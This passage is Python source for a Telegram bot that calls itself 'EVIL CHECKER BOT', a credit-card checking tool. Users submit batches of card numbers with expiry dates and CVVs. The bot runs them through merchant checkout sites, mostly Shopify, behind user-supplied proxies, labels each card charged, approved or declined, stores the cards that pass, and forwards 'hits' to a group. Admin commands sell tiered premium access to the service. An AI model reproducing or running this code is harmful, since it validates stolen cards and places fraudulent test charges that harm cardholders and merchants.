            await save_approved_card(card, "APPROVED", res.get('Response'), res.get('Gateway'), res.get('Price'))
            if "incorrect_zip" in response_text:
                await forward_to_hits_group(card, res.get('Response'), res.get('Gateway'), res.get('Price'), site_index, event.sender_id)
        else:
            status_header = "DECLINED ❌"
            status_result = "Declined"
        
        if status_header == "CHARGED 💎":
            msg = f"""CHARGED 💎

CC ⇾ {card}
Gateway ⇾ {res.get('Gateway', 'Shopify')}
Response ⇾ {res.get('Response', 'Thank You')}
Price ⇾ {res.get('Price', 'Unknown')} 💸
Site ⇾ {site_index}

```BIN Info: {brand} - {bin_type} - {level}
Bank: {bank}
Country: {country} {flag}```

Took {elapsed_time} seconds"""
        else:
            msg = f"""{status_header}

CC ⇾ `{card}`
Gateway ⇾ {res.get('Gateway', 'Unknown')}
Response ⇾ {res.get('Response')}
Price ⇾ {res.get('Price')} 💸
Site ⇾ {site_index}

```BIN Info: {brand} - {bin_type} - {level}
Bank: {bank}
Country: {country} {flag}```

Took {elapsed_time} seconds"""
        
        await loading_msg.delete()
        result_msg = await event.reply(msg)
        if "thank you" in response_text or "payment successful" in response_text: 
            await pin_charged_message(event, result_msg)
    except Exception as e:
        loading_task.cancel()
        await loading_msg.delete()
        await event.reply(f"❌ Error: {e}")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]msh'))
async def msh(event):
    if not await check_membership_and_reply(event):
        return
    
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": 
        return await event.reply(banned_user_message())
    if not can_access:
        buttons = [[Button.url("🚀 Join Group", "https://t.me/+hHylRLru9js1ODk1")], [Button.url("📢 Join Channel", "https://t.me/+lUch4HwcoeE0Nzg1")]]
        return await event.reply("🚫 Unauthorized Access!\n\nYou must join both group and channel to use this bot!\n\nFor private access, contact @DARK_FROXT_73", buttons=buttons)
    
    user_proxies = await get_user_proxies(event.sender_id)
    if not user_proxies:
        return await event.reply("❌ **Proxy Required!**\n\nYou must add a proxy first using `/proxy <proxy>`\n\nExample: `/proxy 45.186.6.104:3128`")
    
    cards = []
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text: 
            cards = extract_all_cards(replied_msg.text)
        if not cards: 
            return await event.reply("Couldn't extract valid cards from replied message\n\nFormat. /msh 4111111111111111|12|2025|123 4111111111111111|12|2025|123")
    else:
        cards = extract_all_cards(event.raw_text)
    if not cards: 
        return await event.reply("Format. /msh 4111111111111111|12|2025|123 4111111111111111|12|2025|123 4111111111111111|12|2025|123\n\nOr reply to a message containing multiple cards")
    
    max_cards = get_cc_limit(access_type, event.sender_id, event.chat_id)
    if event.sender_id in ADMIN_ID:
        limit_msg = f"{max_cards} cards for /msh (Admin)"
    elif access_type in ["premium_private", "premium_group"]:
        limit_msg = f"{max_cards} cards for /msh (Premium)"
    elif access_type == "authorized_group":
        limit_msg = f"{max_cards} cards for /msh (Authorized Group)"
    elif access_type == "group_free":
        limit_msg = f"{max_cards} cards for /msh (Group Free)"
    else:
        limit_msg = f"{max_cards} cards for /msh"
    
    if len(cards) > max_cards:
        cards = cards[:max_cards]
        total_found = len(extract_all_cards(event.raw_text if not event.reply_to_msg_id else replied_msg.text))
        await event.reply(f"``` ⚠️ Only checking first {max_cards} cards out of {total_found} provided. Limit is {limit_msg}.```")
    
    sites = load_json_sync(SITE_FILE)
    user_sites = sites.get(str(event.sender_id), [])
    if not user_sites: 
        return await event.reply("You haven't added any URLs. First add using /add")
    
    asyncio.create_task(process_msh_cards_optimized(event, cards, user_sites))

async def process_msh_cards_optimized(event, cards, sites):
    sent_msg = await event.reply(f"```Processing {len(cards)} cards...```")
    
    proxy = await get_random_user_proxy(event.sender_id)
    
    for i, card in enumerate(cards):
        site_index = i % len(sites)
        current_site = sites[site_index]
        
        result = await check_card_specific_site(card, current_site, proxy)
        
        if isinstance(result, Exception):
            result = {"Response": f"Exception: {str(result)}", "Price": "-", "Gateway": "-"}

        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
        response_text = result.get("Response", "").lower()
        
        if "proxy_required" in response_text:
            continue
        
        if is_site_dead(result.get("Response", "")):
            status_header = "DEAD SITE ⚠️"
            result["Response"] = "Site configuration error"
        elif "thank you" in response_text or "payment successful" in response_text:
            status_header = "CHARGED 💎"
            status_result = "Charged"
            await save_approved_card(card, status_result, result.get('Response'), result.get('Gateway'), result.get('Price'))
            await forward_to_hits_group(card, result.get('Response'), result.get('Gateway'), result.get('Price'), site_index + 1, event.sender_id)
        elif any(key in response_text for key in [
            "incorrect_zip", "card decline", "3dcc", "ccn", 
            "incorrect card number", "card cvv", "card ccn",
            "approved", "success", "incorrect_cvv", "invalid_cvv", 
            "incorrect_cvc", "invalid_cvc", "insufficient funds"
        ]):
            status_header = "APPROVED ✅"
            status_result = "Approved"
            await save_approved_card(card, "APPROVED", result.get('Response'), result.get('Gateway'), result.get('Price'))
            if "incorrect_zip" in response_text:
                await forward_to_hits_group(card, result.get('Response'), result.get('Gateway'), result.get('Price'), site_index + 1, event.sender_id)
        else:
            status_header = "DECLINED ❌"
            status_result = "Declined"
        
        if status_header == "CHARGED 💎":
            card_msg = f"""CHARGED 💎

CC ⇾ {card}
Gateway ⇾ {result.get('Gateway', 'Shopify')}
Response ⇾ {result.get('Response', 'Thank You')}
Price ⇾ {result.get('Price', 'Unknown')} 💸
Site ⇾ {site_index + 1}

```BIN Info: {brand} - {bin_type} - {level}
Bank: {bank}
Country: {country} {flag}```"""
        else:
            card_msg = f"""{status_header}

CC ⇾ `{card}`
Gateway ⇾ {result.get('Gateway', 'Unknown')}
Response ⇾ {result.get('Response')}
Price ⇾ {result.get('Price')} 💸
Site ⇾ {site_index + 1}

```BIN Info: {brand} - {bin_type} - {level}
Bank: {bank}
Country: {country} {flag}```"""
        
        result_msg = await event.reply(card_msg)
        if "thank you" in response_text or "payment successful" in response_text: 
            await pin_charged_message(event, result_msg)
        
        await asyncio.sleep(1)
    
    await sent_msg.edit(f"```✅ Mass Check Complete! Processed {len(cards)} cards.```")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]mysites$'))
async def mysites(event):
    if not await check_membership_and_reply(event):
        return
    
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": 
        return await event.reply(banned_user_message())
    if not can_access:
        return await event.reply("🚫 Unauthorized Access!")
    
    sites_data = load_json_sync(SITE_FILE)
    user_sites = sites_data.get(str(event.sender_id), [])
    
    if not user_sites:
        return await event.reply("❌ You haven't added any sites yet!\nUse `/add example.com` to add sites.")
    
    text = f"📊 **Your Sites ({len(user_sites)})**\n\n"
    for idx, site in enumerate(user_sites[:20], 1):
        text += f"{idx}. `{site}`\n"
    
    if len(user_sites) > 20:
        text += f"\n... and {len(user_sites) - 20} more sites"
    
    text += f"\n\nUse `/add <site>` to add more sites\nUse `/rm <site>` to remove sites\nUse `/check` to test all sites (dead sites auto-removed)"
    
    await event.reply(text)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]proxy\s+(.+)$'))
async def add_proxy(event):
    if not await check_membership_and_reply(event):
        return
    
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": 
        return await event.reply(banned_user_message())
    if not can_access:
        return await event.reply("🚫 Unauthorized Access!")
    
    proxy_str = event.pattern_match.group(1).strip()
    
    status_msg = await event.reply("🔄 **Testing proxy connection...**")
    
    success, message = await add_user_proxy(event.sender_id, proxy_str)
    
    if success:
        await status_msg.edit(f"✅ **Proxy Added Successfully!**\n\n{message}\n\nUse `/myproxy` to see your proxies")
    else:
        await status_msg.edit(f"❌ **Failed to add proxy!**\n\n{message}\n\nFormat examples:\n`/proxy 45.186.6.104:3128`\n`/proxy user:pass@45.186.6.104:3128`")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]myproxy$'))
async def myproxy(event):
    if not await check_membership_and_reply(event):
        return
    
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": 
        return await event.reply(banned_user_message())
    if not can_access:
        return await event.reply("🚫 Unauthorized Access!")
    
    proxies = await get_user_proxies(event.sender_id)
    
    if not proxies:
        return await event.reply("❌ **No proxies found!**\n\nAdd a proxy using `/proxy <proxy>`\n\nExample: `/proxy 45.186.6.104:3128`")
    
    text = f"📊 **Your Proxies ({len(proxies)})**\n\n"
    for idx, proxy in enumerate(proxies, 1):
        text += f"{idx}. `{proxy}`\n"
    
    text += f"\nUse `/proxy <proxy>` to add more\nUse `/rmproxy` to remove all proxies"
    
    await event.reply(text)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]rmproxy$'))
async def rmproxy(event):
    if not await check_membership_and_reply(event):
        return
    
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": 
        return await event.reply(banned_user_message())
    if not can_access:
        return await event.reply("🚫 Unauthorized Access!")
    
    success, message = await remove_user_proxies(event.sender_id)
    
    if success:
        await event.reply(f"✅ **Proxies Removed!**\n\n{message}")
    else:
        await event.reply(f"❌ **Failed to remove proxies!**\n\n{message}")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]info$'))
async def info(event):
    if not await check_membership_and_reply(event):
        return
    
    user_id = event.sender_id
    can_access, access_type = await can_use(user_id, event.chat)
    
    if access_type == "banned":
        return await event.reply(banned_user_message())
    
    try:
        user = await client.get_entity(user_id)
        user_name = user.first_name or "Unknown"
        username = f"@{user.username}" if user.username else "No Username"
    except:
        user_name = "Unknown"
        username = "No Username"
    
    sites_data = load_json_sync(SITE_FILE)
    user_sites = sites_data.get(str(user_id), [])
    
    proxies = await get_user_proxies(user_id)
    
    is_premium = await is_premium_user(user_id)
    
    is_authorized_group = False
    if event.is_group:
        is_authorized_group = await is_group_authorized(event.chat_id)
    
    text = f"""👤 **User Information**

🆔 **ID:** `{user_id}`
📛 **Name:** {user_name}
📱 **Username:** {username}
🔰 **Status:** {'💎 Premium' if is_premium else '🆓 Free'}
📊 **Access Level:** {access_type}
👥 **Authorized Group:** {'✅ Yes' if is_authorized_group else '❌ No'}

📋 **Sites:** {len(user_sites)} sites added
🔗 **Proxies:** {len(proxies)} proxies added
💳 **CC Limit:** {get_cc_limit(access_type, user_id, event.chat_id)} cards

📅 **Joined:** {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""

    if is_premium:
        premium_data = load_json_sync(PREMIUM_FILE)
        user_premium = premium_data.get(str(user_id), {})
        if user_premium:
            expiry = datetime.datetime.fromisoformat(user_premium['expiry'])
            days_left = (expiry - datetime.datetime.now()).days
            text += f"\n⏳ **Premium Expires:** {expiry.strftime('%Y-%m-%d')} ({days_left} days left)"
    
    await event.reply(text)

# --- Other admin commands that were already present ---
@client.on(events.NewMessage(pattern=r'(?i)^[/.]au\s+(-?\d+)$'))
async def authorize_group_command(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("❌ **Admin Only Command!**")
    
    try:
        group_id = int(event.pattern_match.group(1))
        
        success, message = await add_authorized_group(group_id, event.sender_id)
        
        if success:
            await event.reply(f"""✅ **Group Authorized Successfully!**

👥 **Group ID:** `{group_id}`
✅ **Status:** Authorized
💳 **Card Limit:** 200 cards
👑 **Authorized by:** Admin

📝 **Note:** Users in this group can now use /mtxt command with 200 card limit.""")
        else:
            await event.reply(f"❌ **Error:** {message}")
            
    except Exception as e:
        await event.reply(f"❌ **Error:** {str(e)}")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]rm\s+(\d+)$'))
async def remove_premium_command(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("❌ **Admin Only Command!**")
    
    try:
        user_id = int(event.pattern_match.group(1))
        
        is_premium = await is_premium_user(user_id)
        
        if not is_premium:
            return await event.reply(f"❌ **User {user_id} is not a premium user!**")
        
        success = await remove_premium_user(user_id)
        
        if success:
            try:
                user = await client.get_entity(user_id)
                user_info = f"{user.first_name} (@{user.username})" if hasattr(user, 'username') and user.username else f"User ID: {user_id}"
            except:
                user_info = f"User ID: {user_id}"
            
            await event.reply(f"""✅ **Premium Removed Successfully!**

👤 **User:** {user_info}
🆔 **User ID:** `{user_id}`
❌ **Status:** Premium Removed
👑 **Removed by:** Admin

📝 **Note:** User will no longer have premium access.""")
        else:
            await event.reply(f"❌ **Failed to remove premium from user {user_id}!**")
            
    except Exception as e:
        await event.reply(f"❌ **Error:** {str(e)}")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]pmall$'))
async def show_all_premium_command(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("❌ **Admin Only Command!**")
    
    try:
        premium_users = load_json_sync(PREMIUM_FILE)
        
        if not premium_users:
            return await event.reply("📭 **No premium users found!**")
        
        current_time = datetime.datetime.now()
        active_users = []
        expired_users = []
        
        for user_id_str, user_data in premium_users.items():
            user_id = int(user_id_str)
            expiry_date = datetime.datetime.fromisoformat(user_data['expiry'])
            days_left = (expiry_date - current_time).days
            
            try:
                user = await client.get_entity(user_id)
                user_name = user.first_name or "Unknown"
                username = f"@{user.username}" if user.username else "No Username"
            except:
                user_name = "Unknown"
                username = "No Username"
            
            user_info = {
                'user_id': user_id,
                'name': user_name,
                'username': username,
                'expiry': expiry_date,
                'days_left': days_left,
                'added_by': user_data.get('added_by', 'Unknown'),
                'days': user_data.get('days', 'Unknown')
            }
            
            if days_left > 0:
                active_users.append(user_info)
            else:
                expired_users.append(user_info)
        
        active_users.sort(key=lambda x: x['days_left'])
        
        text = "👑 **ALL PREMIUM USERS** 👑\n\n"
        
        if active_users:
            text += f"✅ **ACTIVE USERS ({len(active_users)})**\n"
            for idx, user in enumerate(active_users[:20], 1):
                text += f"{idx}. `{user['user_id']}` - {user['name']} ({user['username']})\n"
                text += f"   ⏰ {user['days_left']} days left | Exp: {user['expiry'].strftime('%Y-%m-%d')}\n"
            
            if len(active_users) > 20:
                text += f"\n... and {len(active_users) - 20} more active users\n"
        
        if expired_users:
            text += f"\n❌ **EXPIRED USERS ({len(expired_users)})**\n"
            for idx, user in enumerate(expired_users[:10], 1):
                text += f"{idx}. `{user['user_id']}` - {user['name']}\n"
            
            if len(expired_users) > 10:
                text += f"... and {len(expired_users) - 10} more expired users\n"
        
        text += f"\n📊 **TOTAL:** {len(premium_users)} users"
        
        await event.reply(text)
        
    except Exception as e:
        await event.reply(f"❌ **Error:** {str(e)}")

# --- Fixed bot_status_command without psutil ---
@client.on(events.NewMessage(pattern=r'(?i)^[/.]status$'))
async def bot_status_command(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("❌ **Admin Only Command!**")
    
    try:
        uptime_seconds = int(time.time() - BOT_START_TIME)
        uptime_str = ""
        
        if uptime_seconds >= 86400:
            days = uptime_seconds // 86400
            uptime_str += f"{days}d "
            uptime_seconds %= 86400
        
        if uptime_seconds >= 3600:
            hours = uptime_seconds // 3600
            uptime_str += f"{hours}h "
            uptime_seconds %= 3600
        
        if uptime_seconds >= 60:
            minutes = uptime_seconds // 60
            uptime_str += f"{minutes}m "
            uptime_seconds %= 60
        
        uptime_str += f"{uptime_seconds}s"
        
        # Basic system info without psutil
        system_info = platform.system()
        python_version = platform.python_version()
        
        premium_users = load_json_sync(PREMIUM_FILE)
        banned_users = load_json_sync(BANNED_FILE)
        sites_data = load_json_sync(SITE_FILE)
        
        total_users = 0
        for user_id in sites_data:
            total_users += 1
        
        active_processes = len(ACTIVE_MTXT_PROCESSES)
        active_sessions = len(ACTIVE_SESSIONS)
        
        text = f"""🤖 **BOT STATUS REPORT** 🤖

⏱️ **UPTIME:** {uptime_str}
📊 **TOTAL CHECKS:** {TOTAL_CHECKS}
🎯 **TOTAL HITS:** {TOTAL_HITS}
🔄 **ACTIVE PROCESSES:** {active_processes}
🔑 **ACTIVE SESSIONS:** {active_sessions}

👥 **USER STATS:**
├─ 👑 **Premium Users:** {len(premium_users)}
├─ 🚫 **Banned Users:** {len(banned_users)}
├─ 👤 **Total Users:** {total_users}
└─ 🔗 **Authorized Groups:** {len(load_json_sync(AUTHORIZED_GROUPS_FILE))}

💻 **SYSTEM INFO:**
├─ 🖥️ **System:** {system_info}
├─ 🐍 **Python:** {python_version}
├─ 🤖 **API Endpoint:** Working
└─ 🔐 **Captcha Solver:** Active

⚡ **PERFORMANCE:**
├─ ⏱️ **Timeout:** 30 seconds
├─ 🚀 **Max Workers:** 5
├─ 🔄 **Max Concurrent:** 3
├─ 🔄 **Max Site Retries:** 3
└─ 📊 **Memory Usage:** Optimized

📅 **Last Updated:** {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""

        await event.reply(text)
        
    except Exception as e:
        await event.reply(f"❌ **Error getting status:** {str(e)}")

# --- FIXED Main Function for Pydroid3 with MemorySession ---
async def main():
    print("🤖 BOT STARTING...")
    
    try:
        # Initialize files
        await initialize_files()
        print("📁 Files initialized")
        
        # Clean any existing session files to avoid conflicts
        session_files = ['session.session', 'session.session-journal']
        for session_file in session_files:
            if os.path.exists(session_file):
                try:
                    os.remove(session_file)
                    print(f"🗑️ Removed old session file: {session_file}")
                except:
                    pass
        
        # Start the client with bot_token - using MemorySession
        print("🔗 Connecting to Telegram...")
        
        # For Pydroid3, use MemorySession (no file I/O)
        await client.start(bot_token=BOT_TOKEN)
        
        # Get bot info
        me = await client.get_me()
        print(f"✅ Bot started successfully!")
        print(f"👤 Bot ID: {me.id}")
        print(f"📛 Bot Username: @{me.username}")
        print(f"👑 Admin ID: {ADMIN_ID}")
        print(f"👑 Owner ID: {OWNER_ID}")
        print(f"🔗 API Endpoint: {API_ENDPOINT}")
        print(f"🎯 Hits Group: {HITS_GROUP_ID}")
        print(f"⏱️ Timeout: 30 seconds")
        print("📢 Bot is now running and listening for commands...")
        
        # Keep the bot running
        await client.run_until_disconnected()
        
    except Exception as e:
        print(f"❌ Error starting bot: {e}")
        import traceback
        traceback.print_exc()

# --- Start the Bot ---
if __name__ == "__main__":
    print("🚀 Initializing EVIL CHECKER BOT...")
    
    # Create necessary directory for files
    try:
        # Create files directory if it doesn't exist
        for file_name in [PREMIUM_FILE, FREE_FILE, SITE_FILE, KEYS_FILE, BANNED_FILE, PROXY_FILE, AUTHORIZED_GROUPS_FILE, RESULTS_FILE]:
            create_json_file_sync(file_name)
    except:
        pass
    
    # Run the bot
    try:
        client.loop.run_until_complete(main())
    except KeyboardInterrupt:
        print("\n👋 Bot stopped by user")
    except Exception as e:
        print(f"❌ Fatal error: {e}")
        import traceback
        traceback.print_exc()
